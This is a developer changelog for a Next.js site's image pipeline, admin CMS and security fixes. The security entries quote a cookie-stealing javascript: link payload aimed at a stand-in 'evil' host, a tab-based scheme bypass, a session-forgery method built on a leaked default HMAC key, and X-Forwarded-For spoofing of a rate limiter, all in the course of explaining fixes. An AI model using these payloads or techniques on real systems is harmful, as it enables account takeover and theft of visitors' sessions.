# Changelog

What changed and why. Newest first. The format is defined in `AGENTS.md`;
every agent and developer adds an entry for anything that alters behaviour,
output, build steps or deploy steps.

The "Watch" lines are the point of this file: they are what a later change can
break by not knowing.

## Unreleased

### Cover images now go through the image pipeline, not a flat full-size `<img>`
- **What** New `CoverImage` component (`src/components/ui/cover-image.tsx`)
  looks up `article.coverImage` in `publishedImageSizes` (the same map the
  in-body image block already uses) and renders `next/image` with `fill` and
  a real `sizes` attribute when the path is one the build pipeline published;
  only a genuine admin upload or pasted external URL - which has no known
  dimensions - falls back to a plain `<img>`. Wired into all four places a
  cover image renders: the `/knowledge` grid, the homepage preview cards, the
  article hero, and the sidebar's 80px thumbnails.
- **Why** Every cover image added this session happens to be a real portfolio
  or process photo already in `public/images` with pre-built `public/v`
  variants - but the first pass rendered all of them as plain `<img src>`
  regardless, serving the full 1600px file everywhere a cover image appears,
  including an 80px sidebar thumbnail. Confirmed the fix: the sidebar
  thumbnail's `srcset` now offers 256w-1600w and its `sizes="80px"` picks the
  256w variant instead of downloading the 1600px original six times per
  article page (three sidebar items, duplicated for the responsive layout).
- **Watch** `CoverImage` requires a `position: relative` ancestor with a
  defined size (an `aspect-*` wrapper) - it renders with `fill` on the
  pipeline path, which needs a sized, positioned parent to fill. The plain
  `<img>` fallback still exists and is still correct for uploads: don't
  remove it to "simplify" the component, or a real admin upload with no
  pipeline variant will break.

### Stopped animating `box-shadow` on the knowledge card hover-lift
- **What** `knowledge-preview.tsx` and `knowledge-search-grid.tsx` both had
  `transition-all` on the card `<Link>`, which also has `hover:shadow-panel`
  (a two-layer, 32px-blur box-shadow). Scoped the transition to
  `transition-transform` instead - the card still lifts (`-translate-y-1`)
  with an eased transition, but the shadow now snaps instantly on hover
  rather than animating.
- **Why** Reported as the site feeling noticeably heavier while scrolling.
  `transition-all` makes the browser watch every animatable property, and
  animating `box-shadow` specifically forces a full repaint of an area larger
  than the element (the blur radius), every frame, for as long as the hover
  state and the 300ms transition overlap - which is exactly what happens when
  a visitor scrolls with a wheel while the cursor rests over a card. The
  project's own `project-card.tsx` already scopes its hover transition to
  `transition-transform` for this reason; these two cards just didn't follow
  it.
- **Watch** An instantly-snapping shadow on hover is the intended trade-off,
  not a bug - don't "fix" it by adding the shadow back into a broad
  transition. If a card ever needs an animated shadow specifically, the cheap
  way is a separate absolutely-positioned shadow layer whose *opacity*
  crossfades (compositor-only), not animating `box-shadow` directly.

### Login rate limiter now also keys on username, not just the spoofable client IP
- **What** `src/lib/rate-limiter.ts` runs two independent limiters instead of
  one: the existing per-IP counter, plus a new per-username counter.
  `loginAdminAction` checks and records failures against both, and only
  resets both together on a real login.
- **Why** `extractClientIp()` (in `auth.ts`) reads `X-Forwarded-For`, which is
  entirely client-supplied and unverified - the code already says as much in
  a comment there. A login attempt with a different fake IP on every request
  got a fresh 3-attempt allowance each time, so the "3 tries then 10-minute
  block" promised on the login screen never actually engaged. Verified with
  an isolated script: the IP-only limiter stayed at "2 remaining" across five
  distinct fake IPs in a row, while the new username limiter correctly
  blocked on the third attempt and stayed blocked - independent of what IP is
  claimed, since it never reads one.
- **Watch** The username key is lower-cased and trimmed before lookup, so
  "admin", "Admin" and "ADMIN" all share one counter - don't key it on the raw
  input, or that normalization (and the protection) is gone. The login page's
  copy used to say the *IP* would be blocked; it now says *access* is
  blocked, since blocking is no longer only IP-scoped.

### Article body links now go through a scheme allow-list before becoming `<a href>`
- **What** Added `isSafeHref()` to `src/lib/article-utils.ts`, allowing only
  `http:`, `https:`, `mailto:`, `tel:`, and scheme-less relative paths
  (`/...`, `#...`). Applied it in `FormattedText` (renders article bodies on
  the public site) and in the admin markdown editor's live-preview link
  rendering, which had the identical unguarded pattern.
- **Why** `[text](url)` parsing took the URL straight from the markdown with
  no validation and rendered it into `<a href={url}>`.
  `[Klik di sini](javascript:fetch('https://evil/steal?c='+document.cookie))`,
  saved as ordinary article body text through the admin editor, published as
  a real clickable link on `/knowledge/[slug]` - it runs in the browser of
  whichever site visitor clicks it, not the account that wrote it. Built on
  the `URL` constructor rather than a regex: WHATWG's URL parser strips
  embedded tabs/newlines before reading the scheme, which closes the classic
  `jav\tascript:` bypass a naive string check would miss - verified against
  12 cases (6 safe, 6 malicious) including that one.
- **Watch** An unsafe href degrades the link to plain text (just the label, no
  `<a>`) rather than dropping it - a reader still sees the words. The two
  copies of this link-parsing logic (public renderer, admin preview) are still
  duplicated; if a third one is ever added, it needs the same `isSafeHref`
  guard, not a fresh regex.

### Guide articles gained cover images, shown in cards, the article hero, and structured data
- **What** `KnowledgeArticle` gained optional `coverImage` / `coverImageAlt`
  fields. The admin editor got an upload-or-paste-URL field (reusing the
  existing `uploadArticleImageAction` pipeline) with a live preview. The image
  now renders on the `/knowledge` grid, the homepage preview section, and as a
  hero image on the article page itself, plus feeds the `image` field of the
  Article JSON-LD when present.
- **Why** Every card was pure text - four identical-looking rectangles with no
  way to tell them apart at a glance. Filled in real photos from the existing
  portfolio (a survey/measurement shot, an open wardrobe, two kitchens)
  matched to what each article actually explains, rather than stock or
  placeholder images.
- **Watch** Rendered as a plain `<img>`, not `next/image`, everywhere -
  deliberately, matching how in-body images already handle admin uploads and
  pasted URLs: no pipeline variants exist for these, so `next/image` would
  just be a pass-through wrapper. Cards fall back to a text-only layout (no
  broken-image box) when `coverImage` is unset, which is still true for any
  article an admin creates without one.

### Knowledge cards redesigned: photo-first, category pill, and a `/knowledge` search + sidebar
- **What** Rebuilt the article cards on `/knowledge` and the homepage preview
  section (image on top when set, reading time, title with a hover-filling
  arrow badge, category pill + date footer) and extracted the `/knowledge`
  grid into a client component (`KnowledgeSearchGrid`) that filters by
  title/category/summary as you type. The homepage preview section now shows
  a "Lihat Semua Panduan" link once there are more than four articles. The
  article detail page (`/knowledge/[slug]`) is now a two-column layout with a
  sticky sidebar (`lg:sticky lg:top-24`) listing up to four other guides,
  replacing the old full-width "Panduan lainnya" block at the bottom of the
  page.
- **Why** Requested after the four-card homepage grid went to
  `lg:grid-cols-4`, which squeezed each card to ~340px and wrapped titles onto
  five lines. Search and the sidebar exist for the same reason the see-all
  link does: none of them mattered at four articles, all three start
  mattering the moment there are more.
- **Watch** Two rendering bugs surfaced and were fixed while building this,
  worth knowing if the cards are touched again: (1) the category+time header
  row needs `shrink-0 whitespace-nowrap` on the time badge, or a long category
  name pushes it onto two lines; (2) cards must sit on
  `bg-surface-container-lowest`, not `-container-low` - the latter is only six
  RGB points off the section's own `bg-surface` and the card boundary
  disappears. The sidebar caps at four other guides and only shows its own
  "Lihat Semua" link past that count - it is not meant to list everything.

### Fixed a cream seam between the public header's spacer and the admin panel
- **What** Moved the `pt-20` that clears the public site's fixed header from
  `<main>` in the root layout into `PageTransition`, which already reads the
  route via `usePathname()` and now skips the padding on `/admin/*` routes.
- **Why** `Header` already renders `null` on admin routes, but the root layout
  applied `pt-20` to `<main>` unconditionally regardless - the padding
  survived as a bare strip of the body's cream background sitting on top of
  the admin panel's own white surface, printing a hard seam right under the
  admin header.
- **Watch** `Header`, `Footer`, and `StickyMobileCta` already key their own
  visibility off this same `pathname.startsWith("/admin")` check - if a
  fourth piece of chrome needs the same admin exception, follow that pattern
  rather than inventing a new one.

### Redesigned the admin CMS shell, dashboard, and login screen
- **What** Reworked `admin/layout.tsx` (header, now a top-to-bottom
  `surface` → `surface-container-lowest` gradient instead of flat white), the
  articles dashboard (unified stat tiles with icon chips, a real segmented
  filter control, refined empty state), and the login page (icon-mark card,
  plus an autofill-color override in `globals.css` so saved-credential
  autofill doesn't paint fields the browser's own blue or yellow).
- **Why** The panel previously used ad-hoc inline styling that didn't match
  the token system the rest of the site (`--color-surface-container-*`,
  `--shadow-hairline`, etc.) already defines in `globals.css` - three
  disconnected stat boxes, a plain-border tab row, and a login card with no
  depth.
- **Watch** Deliberately did **not** adopt generic frontend-skill defaults
  (Geist/zinc palette, phosphor icons, spring-physics motion) here - this
  project already has its own single-accent "Warm Architectural Editorial"
  system and a documented preference for CSS-only motion over JS-driven
  animation (see `reveal.tsx`). Match that system on any further admin work
  rather than reaching for generic conventions.

### `npm run admin:password` now prints a pre-escaped hash
- **What** `scripts/admin-credentials.mjs` escapes every `$` in the scrypt
  hash as `\$` before printing it, so the line you paste into `.env.local`
  (`ADMIN_PASSWORD_HASH=scrypt\$32768\$8\$1\$<salt>\$<key>`) is already safe.
- **Why** Next.js's env loader (`@next/env`) interpolates unescaped `$word` as
  a reference to another env var, same as shell parameter expansion. Segments
  like `$32768` or `$1` in the raw hash (`scrypt$N$r$p$salt$key`) matched that
  pattern, resolved to nothing, and silently gutted the stored hash. Login then
  failed with the generic "ADMIN_PASSWORD_HASH is malformed" from
  `src/lib/auth.ts`, which reads like a bad password, not a parsing bug -
  there was no hint anywhere that `.env.local` values needed escaping.
- **Watch** The same interpolation risk applies to any future env value that
  contains a literal `$` (a different hash format, anything with its own
  `$`-delimited fields) - escape it the same way if it's ever hand-typed
  rather than generated by this script.

### A runnable migration prompt for the second developer's agent
- **What** `SYNC-AGENT.md`: step-by-step instructions an AI agent executes to
  move Developer B's clone onto this repository, with a proof step before the
  switch and guardrails against force-pushing or committing secrets.
- **Why** `CONTRIBUTING.md` explains the workflow to a person; this is written
  to be run. The steps are ordered so nothing is discarded before it is proven
  to exist on `master`.
- **Watch** It describes `master`, not the open `feat/optimasi-gambar` branch.
  The first draft claimed `public/v`, `prepare:variants` and a 98-page build,
  all of which live only on that branch - `master` builds 65 pages and has no
  image pipeline. Re-check those numbers when the branch merges.

### Migration steps for the second developer now cover the admin credentials
- **What** `CONTRIBUTING.md` gains three steps: `npm install` (sharp moved to
  `dependencies`), the first `npm run build` that creates `public/v`, and
  generating `ADMIN_SECRET` / `ADMIN_PASSWORD_HASH` locally.
- **Why** The migration was written before the admin panel failed closed. A
  developer following the old steps would land on a working site with a dead
  `/admin` and no clue why, since the reason only appears in the server log.
- **Watch** Those values are per machine. `.env.local` is git-ignored, so they
  are never shared between developers, and production must not reuse a local
  one.
### Uploaded article images are resized, and a data-URI fallback is gone
- **What** Admin uploads are now resized to 1600px WebP on the way in, `sharp`
  moved to `dependencies`, the public article page routes pipeline-published
  images through `next/image`, and the nine `no-img-element` / unused-variable
  warnings are cleared.
- **Why** Two of the warnings were pointing at real defects. Uploads were stored
  untouched at up to 10 MB and rendered full size on a public page. And a failed
  upload silently stored the `readAsDataURL` preview as the image source - a
  10 MB photo becomes ~13 MB of base64, written into the tracked
  `custom-articles.json` and served inline in public HTML. It looked correct in
  the editor, because the browser that made the data URI can always render it.
- **Watch** The public page picks per image on purpose: a path the manifests
  know gets `next/image` with looked-up dimensions and the same className, so
  the layout is unchanged; uploads and pasted remote URLs keep a plain `<img>`,
  because through the pass-through loader `next/image` would emit a srcset of
  identical URLs or need `unoptimized`, gaining nothing. The remaining `<img>`
  uses each carry an inline reason - do not "fix" them without reading it.

### Closed an authentication bypass in the admin panel
- **What** Removed every credential default from `src/lib/auth.ts`, split the
  session signing key from the password, bounded the session timestamp at both
  ends, and added `npm run admin:secret` / `npm run admin:password` plus
  scrypt-hashed password storage.
- **Why** `ADMIN_PASSWORD` defaulted to a literal in the source and the signing
  key defaulted to that literal plus a fixed suffix. The repository is public
  and none of the variables were set, so the key was the public constant
  `niscala2026_salt_niscala`. Anyone could compute
  `<timestamp>.HMAC(timestamp, key)`, set the session cookie, and hold a full
  admin session without touching the login form - which meant the rate limiter
  never saw them. Verified by forging a token and using it; the admin list
  returned 72 KB with four articles. After the fix the same token returns a
  response byte-identical to sending no cookie at all.
- **Watch** Three things a later change can get wrong here.
  (1) `isAdminAuthenticated()` denies rather than throws when the config is
  missing, on purpose: throwing would fail `next build` and turn a
  misconfiguration into a dead site instead of a disabled panel. Verified the
  build still succeeds with no admin variables set.
  (2) scrypt, not bcrypt or argon2, because those are native addons and a build
  on this host has already died over a native binary and an old glibc.
  (3) The scrypt cost parameters live *inside* the hash string. Keeping them as
  a shared constant is what broke the first attempt - the generator used
  N=32768 while the verifier fell through to Node's default of 16384, and the
  correct password was rejected.

### Agent and contributor documentation
- **What** Added `CHANGELOG.md`, `CONTRIBUTING.md`, and a project-rules section
  in `AGENTS.md` covering commands, document ownership, and the traps that have
  already cost time.
- **Why** Two developers and several agents were each re-deriving the same
  constraints. `CODEX_MEMORY.md` had already gone stale — it still described a
  Turbopack build and knew nothing about the admin panel or the image loader.
- **Watch** `AGENTS.md` is loaded automatically by Claude Code via `CLAUDE.md`
  and read directly by other agents, so it is the only file guaranteed to be
  seen. Anything an agent must not get wrong belongs there, not here.

### Merged the admin-panel branch
- **What** Brought Developer B's four commits (article admin panel, login,
  editor, image and YouTube embeds) into `master`, then merged `master` into
  `feat/optimasi-gambar`. Five files conflicted and were resolved by taking
  whichever side was more complete per hunk.
- **Why** The two branches had diverged from `afc8d4e` and both had touched the
  homepage sections while independently fixing the same mobile problems.
- **Watch** `sticky-mobile-cta.tsx` merged with **no** conflict and was broken
  anyway: an early `/admin` return landed above a `useEffect`, leaving a
  conditional hook that throws on navigation out of `/admin`. Lint caught it,
  git could not. A clean merge here is not evidence of a working merge — run
  `npm run lint` and `npm run build` after every merge.

### Kept `--text-display-mobile` at 40px
- **What** Declined the admin branch's 34px for this token.
- **Why** `--text-headline-lg-mobile` is 36px. At 34px the largest step in the
  scale renders smaller than the step beneath it, everywhere the token is used —
  hero, closing CTA, CTA banner.
- **Watch** Both branches were chasing the same goal, a hero that does not push
  the proof bar below the fold on a 360px phone. If the hero specifically needs
  to be smaller, that belongs on the hero's own class.

### Pre-rendered responsive image variants; runtime optimiser off
- **What** `scripts/build-image-variants.mjs` writes every width in the ladder
  into `public/v` before the build. A custom `next/image` loader
  (`src/lib/image-loader.ts`) points at those files. `/_next/image` now 404s.
- **Why** On Hostinger shared hosting a cold `/_next/image` request measured
  **1.8–2.8s TTFB** because `sharp` encoded on demand, and the cache behind it
  lives in `.next/cache/images`, which every rebuild wipes — so the first
  visitor after each deploy paid it again. The same request now serves in
  **23ms**.
- **Watch** WebP only, deliberately. Measured on this project's own photography
  at 1280px: webp 202ms / 79.6 KB against avif 5081ms / 65.5 KB. AVIF is 25×
  slower to encode for 18% fewer bytes, which is a 45-minute build instead of a
  1-minute one. Do not "improve" this by re-enabling AVIF without re-measuring
  on the target host.

### Hard-linked the duplicate top ladder rung
- **What** Ladder steps at or above a source's own width are copied once and
  hard-linked thereafter, with a copy fallback.
- **Why** 227 of 232 sources are 1280px wide or narrower, so the 1600 rung was a
  byte-for-byte duplicate of 1280. The tree went from 63.2 MB to 39.9 MB.
- **Watch** Uploading over FTP expands links back into files. The saving is real
  only when the build runs on the server.

### Blur placeholders via `placeholder`, not `placeholder="blur"`
- **What** `npm run prepare:blur` writes a 16px LQIP into the manifests;
  `src/lib/image-placeholder.ts` passes it as a `data:` URI.
- **Why** `placeholder="blur"` wraps the URI in an inline SVG carrying two
  `feGaussianBlur` passes, a `feColorMatrix` and two `feComposite` nodes — about
  1 KB per image, repeated in the flight payload. That more than doubled
  `/portfolio`. Passing the URI directly paints it as a plain background, and
  the browser's own upscaling supplies the blur the filter was faking.
- **Watch** Roughly 150 bytes per image either way; the SVG is the expensive
  part, not the placeholder.

### Spelled out `sizes` instead of approximating with `vw`
- **What** Portfolio grids declare real slot widths.
- **Why** `30vw` was a stand-in for the container arithmetic and drifted on wide
  screens: the container caps at 1440px with 64px gutters, so a card is 416px on
  a 1920px display, not 576px.
- **Watch** Next narrows a srcset only when `sizes` contains a bare integer
  `vw` preceded by whitespace — its regex is `/(^|\s)(1?\d?\d)vw/`. A `calc()`
  disables that narrowing, so all ladder widths are offered. Measured cost:
  1.1 KB gzipped, accepted so low-DPR phones keep the small variants.

### Long-lived caching for images
- **What** `/images`, `/logo` and `/v` are served `immutable` for a year.
- **Why** The host returned them with no `Cache-Control` at all, so browsers
  fell back to heuristic caching and revalidated far more often than needed.
